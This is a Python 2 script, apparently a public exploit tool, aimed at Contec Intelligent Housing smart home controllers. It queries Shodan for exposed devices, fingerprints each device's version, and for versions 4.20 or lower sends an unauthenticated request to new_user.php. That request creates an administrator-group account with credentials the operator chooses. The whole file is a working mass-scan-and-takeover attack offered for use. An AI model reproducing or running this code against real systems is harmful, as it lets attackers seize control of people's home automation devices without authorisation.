#!/usr/bin/env python
#-*- coding: utf-8 -*-

# Contec Intelligent Housing Smart Home Exploiter that uses the Shodan API to find targets.
# Written by: Sanduuz
# Author: Sanduuz

print "Loading Modules..."

import sys, os, re
try:
    import shodan
except ImportError:
    print "Missing Library: Shodan"
    exit("Please install library: `pip install shodan`")

try:
    import requests
except ImportError:
    print "Missing Library: Requests"
    exit("Please install library: `pip install requests`")

try:
    from bs4 import BeautifulSoup
except ImportError:
    print "Missing Library: BS4"
    exit("Please install library: `pip install bs4`")

def acquireAPIKey():
    APIKeyExists = os.path.isfile('./APIKEY/API.key')
    if APIKeyExists == False:
        try:
            print "API Key Not Found! | Please Supply API Key For The First Time!"
            APIKey = str(raw_input("API Key: "))
            try:
                with open('./APIKEY/API.key', 'w') as f:
                    f.write(APIKey)
                return (APIKey, True)
            except:
                return False
        except Exception as err:
            exit(err)
        except KeyboardInterrupt:
            exit("\n^C Detected!\nExiting...")
        except EOFError:
            exit("\n^C Detected!\nExiting...")
    elif APIKeyExists == True:
        with open('./APIKEY/API.key') as f:
            APIKey = f.read()
        return (APIKey, True)
    else:
        exit('Unknown Error Occured!')

def searchTargets(APIKey):
    API = shodan.Shodan(APIKey)
    while True:
        try:
            returnCount = int(raw_input("How many IP's to scan?: "))
            results = API.search('content/smarthome.php')
            print '\n%s Results Found!' % (results['total'])
            if returnCount >= results['total']:
                print "Amount of IP's to scan is greater than the total results!\nShowing all results."
            print "----- [INFO] -----"
            iter = 0
            for result in results['matches']:
                try:
                    req = requests.get('http://'+result['ip_str']+':9000/content/smarthome.php', timeout=3)
                    if req.status_code == 200:
                        try:
                            src = req.text
                            txt = BeautifulSoup(src, "lxml")
                            h3 = txt.find('h3')
                            versionNumber = ''.join(map(str, str(h3.contents).encode('UTF-8')))
                            versionNumber = re.findall('\d+', versionNumber)
                            while len(versionNumber) > 2:
                                versionNumber.pop(0)
                            versionNumber = versionNumber[0]+'.'+versionNumber[1]
                            if float(versionNumber) <= 4.20:
                                print "IP: %s | Version: %s | %s" % (result['ip_str'], versionNumber, "Vulnerable!")
                            elif float(versionNumber) > 4.20:
                                print "IP: %s | Version: %s | %s" % (result['ip_str'], versionNumber, "Not Vulnerable!")
                            else:
                                exit("Unknown Error Occured!")
                        except ValueError:
                            print "Oops, Unknown Error Occured!"
                        except:
                            pass
                    elif req.status_code == 403:
                        print "IP: %s | %s |%s" % (result['ip_str'], "Not Vulnerable! [Access Denied]")
                    else:
                        print "IP: %s | %s | %s [Status Code: ]" % (result['ip_str'], "Vulnerability Unknown!", req.status_code)
                    #print "IP: %s" % (result['ip_str'])
                    iter += 1
                    if iter >= returnCount:
                        exploitDevices_ = str(raw_input("Exploit Devices? [Y/N]: ")).upper()
                        if exploitDevices_ == "Y" or exploitDevices_ == "YES":
                            exploit()
                            break
                        elif exploitDevices_ == "N" or exploitDevices_ == "NO":
                            exit()
                        else:
                            exit("Expected Y/N, got '"+exploitDevices_+"' Instead.\nExiting...")
                except requests.exceptions.ConnectionError:
                    print "IP: %s | %s" % (result['ip_str'], "Not Vulnerable! [Connection Refused]")
                    continue
        except ValueError:
            print "Please input integer value!"
        except KeyboardInterrupt:
            exit('\n^C Detected!\nExiting...')
        except EOFError:
            exit('\n^C Detected!\nExiting...')
        except Exception as errstr:
            exit(errstr)

def exploit():
    chooseDevice_ = str(raw_input("Target-IP: "))
    print "Checking Target..."
    try:
        checkTarget = requests.get('http://'+chooseDevice_+':9000/content/smarthome.php', timeout=3)
        if checkTarget.status_code == 200:
            try:
                src = checkTarget.text
                txt = BeautifulSoup(src, "lxml")
                h3 = txt.find('h3')
                versionNumber = ''.join(map(str, str(h3.contents).encode('UTF-8')))
                versionNumber = re.findall('\d+', versionNumber)
                while len(versionNumber) > 2:
                    versionNumber.pop(0)
                versionNumber = versionNumber[0]+'.'+versionNumber[1]
                if float(versionNumber) <= 4.20:
                    print "Device Vulnerable! Make your own credentials!"
                    username = str(raw_input("Enter Username: "))
                    if username == '':
                        exit("Username not supplied!\nExiting...")
                    password = str(raw_input("Enter Password: "))
                    if password == '':
                        exit("Password not supplied!\nExiting...")
                    print "\nHere Are Your Credentials!:"
                    print "Username: "+username+'\nPassword: '+password
                    print "\nInjecting user..."
                    injectUser = requests.get('http://'+chooseDevice_+':9000/content/new_user.php?user_name='+username+'&password='+password+'&group_id=1', timeout=10)
                    if injectUser.status_code == 200:
                        exit("Succesfully injected user!\nNow login with your credentials at http://"+chooseDevice_+":9000/content/smarthome.php")
                    else:
                        exit("Failed to inject user!")
                elif float(versionNumber) > 4.20:
                    exit("Device Not Vulnerable!\nExiting...")
                else:
                    exit("Unknown Error Occured!")
            except ValueError:
                exit("Oops, something went wrong!")
            except requests.exceptions.ConnectionError:
                exit("Failed to connect! [Connection Refused]")
            except requests.exceptions.Timeout:
                exit("Failed to connect! [Connection Timed Out]")
        else:
            exit("Device not Vulnerable! Returned status code "+checkTarget.status_code)
    except requests.exceptions.ConnectionError:
        exit("Connection Failed! Make sure the IP is correct.")

def main():
    print banner
    APIKeyValue = acquireAPIKey()
    if APIKeyValue[1] == False:
        exit('Unknown Error Occured!')
    elif APIKeyValue[1] == True:
        APIKey = APIKeyValue[0]
        while True:
            try:
                exploitOrScan_ = str(raw_input("[E]xploit Or [S]can Devices? [E/S]: ")).upper()
                if exploitOrScan_ == "E" or exploitOrScan_ == "EXPLOIT":
                    exploit()
                    break
                elif exploitOrScan_ == "S" or exploitOrScan_ == "SCAN":
                    searchTargets(APIKey)
                    break
                else:
                    print "Please Choose E/S!"
            except KeyboardInterrupt:
                exit("\n^C Detected!\nExiting...")
            except EOFError:
                exit('\n^C Detected!\nExiting...')
    else:
        exit('Unknown Error Occured!')

banner = """
  ___ _  _ ___ _____
 / __| || | __|_   _|
 \__ \ __ | _|  | |
 |___/_||_|___| |_|

----- AUTHOR - Sanduuz -----
- Instagram - @Sanduuz -----
- E-mail - 19jdmz5js@protonmail.ch

"""

if __name__ == '__main__':
    main()
